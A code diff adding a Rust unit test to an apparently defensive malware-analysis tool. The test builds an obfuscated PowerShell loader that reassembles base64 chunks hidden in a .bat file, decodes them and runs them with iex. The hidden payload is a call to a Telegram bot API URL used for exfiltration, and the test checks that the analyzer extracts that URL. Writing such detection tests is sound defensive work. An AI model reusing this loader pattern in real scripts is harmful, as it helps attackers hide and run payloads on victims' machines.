@@ -10865,6 +10865,55 @@ if ($finalScript -ne $null) {{
     }
 
     #[test]
+    fn ps1_marker_chunk_unicode_base64_carrier_recurses_into_download_trait() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-RestMethod -Uri 'https://api.telegram.org/bot456:def/sendMessage?chat_id=888'";
+        let mut utf16 = Vec::new();
+        for unit in decoded.encode_utf16() {
+            utf16.extend_from_slice(&unit.to_le_bytes());
+        }
+        let b64 = base64::engine::general_purpose::STANDARD.encode(utf16);
+        let noisy = format!(
+            "{}waikikibondibeach{}npd{}",
+            &b64[..32],
+            &b64[32..96],
+            &b64[96..]
+        );
+        let chunk_len = noisy.len().div_ceil(5);
+        let chunks: Vec<&str> = noisy
+            .as_bytes()
+            .chunks(chunk_len)
+            .map(|chunk| std::str::from_utf8(chunk).unwrap())
+            .collect();
+        let ps = format!(
+            r#"$banana="$env:USERPROFILE\aoc.bat";if(Test-Path $banana){{$rawLines=gc $banana|?{{$_ -like ":::*"}};$part1=($rawLines|?{{$_ -like ":::1*"}}|%{{$_.Substring(4)}});$part2=($rawLines|?{{$_ -like ":::2*"}}|%{{$_.Substring(4)}});$part3=($rawLines|?{{$_ -like ":::3*"}}|%{{$_.Substring(4)}});$part4=($rawLines|?{{$_ -like ":::4*"}}|%{{$_.Substring(4)}});$part5=($rawLines|?{{$_ -like ":::5*"}}|%{{$_.Substring(4)}});$kiwi=$part1+$part2+$part3+$part4+$part5;$apple=($kiwi-replace"waikikibondibeach",""-replace"npd","");iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($apple)))}}
+:::1{}
+:::2{}
+:::3{}
+:::4{}
+:::5{}"#,
+            chunks.first().copied().unwrap_or(""),
+            chunks.get(1).copied().unwrap_or(""),
+            chunks.get(2).copied().unwrap_or(""),
+            chunks.get(3).copied().unwrap_or(""),
+            chunks.get(4).copied().unwrap_or("")
+        );
+        let report = analyze(ps.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src.contains("api.telegram.org/bot456:def/sendMessage?chat_id=888")
+            )),
+            "marker chunk Unicode Base64 payload did not emit Telegram URL: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_sorted_comment_chunks_are_extracted() {
         let script = concat!(
             ":: 030000000002eadable.example/a.ps1\r\n",
